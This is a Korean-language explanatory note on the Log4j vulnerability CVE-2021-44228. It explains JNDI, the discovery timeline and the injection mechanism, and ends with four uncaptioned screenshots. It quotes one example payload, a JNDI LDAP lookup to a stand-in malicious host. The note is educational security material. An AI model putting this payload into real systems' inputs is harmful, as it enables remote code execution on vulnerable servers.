JNDI는 자바에서 디렉토리를 이용하여 데이터를 호출할 수 있게 해주는 디렉토리 서비스(Directory Service)다. JNDI는 다양한 디렉토리 서비스를 이용할 수 있게 하는 CORBA COS, Java RMI Registry, LDAP등의 SPI를 제공한다. 공격자는 LDAP URL을 컨트롤하여 자신의 통제 하에 Java 프로그램을 실행시켜 오브젝트를 로드할 수 있게 되는데 CVE-2021-44228 취약점은 이점을 공격에 활용하게 된다.

Apache Log4j 사태의 포문을 연 CVE-2021-44228 취약점은 2013년 Log4j2 version 2.0-beta9부터 도입된 ‘JNDILookup plugin(LOG4J2-313)’기능을 활용해 JNDI가 ‘${jndi}’명령에 특정 서식이 포함된 로그 메시지를 받게되면 JNDI Injection이 발생되는 취약점이다.

**JNDI(Java Naming and Directory Interface)**

- Java프로그램이 디렉토리를 통해 데이터(Java객체형태)를 찾을 수 있도록 하는 디렉토리 서비스
- Java 애플리케이션이 조회를 수행하고 LDAP, RMI, DNS 등과 같은 프로토콜을 사용하여 Java 객체를 검색할 수 있도록 하는 Java API
- 애플리케이션이 RMI 레지스트리에 등록된 원격 객체 또는 LDAP와 같은 디렉토리 서비스와 상호 작용할 수 있는 API를 제공

- **발견 및 공개**
    - **발견**: 2021년 11월 24일, 중국의 보안 연구원인 Chen Zhaojun이 처음으로 이 취약점을 발견하여 Apache Software Foundation에 보고.
    - **공개**: 2021년 12월 9일, Apache Software Foundation이 공식적으로 CVE-2021-44228로 명명된 이 취약점을 공개.
- **취약점의 본질**
    - Log4j는 자바 기반의 로깅 유틸리티로, 애플리케이션의 로그를 기록하는 데 널리 사용된다.
    - 이 취약점은 Log4j 2.x 버전에서 발생하며, 특정 로그 메시지를 처리할 때 JNDI(Java Naming and Directory Interface)를 통해 원격 코드를 실행할 수 있도록 허용한다.
    - 공격자는 악성 페이로드를 포함한 특수한 문자열을 로그에 기록하게 하여, 서버가 이 문자열을 처리할 때 원격에서 악성 코드를 다운로드하고 실행하게 만들 수 있다.
- **공격 방식**
    - 공격자는 로그 메시지 또는 로그 매개변수에 `${jndi:ldap://malicious.com/a}`와 같은 문자열을 포함시킨다.
    - Log4j가 이 문자열을 처리할 때, JNDI를 통해 지정된 URL에서 악성 코드를 다운로드하고 실행하게 된다.
    - 이로 인해 원격 코드 실행(RCE) 공격이 가능해진다.

---

1.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/9bf36ad3-0719-431a-b1e2-3f429aeb690d/cea34b66-c870-48bb-a19d-5452b695e551/Untitled.png)

2.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/9bf36ad3-0719-431a-b1e2-3f429aeb690d/c587b428-8c7d-4325-aea6-1cf8d99c0645/Untitled.png)

3.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/9bf36ad3-0719-431a-b1e2-3f429aeb690d/fdef0af1-3f71-4cc5-9239-76ba3e86f9c0/Untitled.png)

4.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/9bf36ad3-0719-431a-b1e2-3f429aeb690d/084a401f-9f9f-4fbf-95c5-0f2366050081/Untitled.png)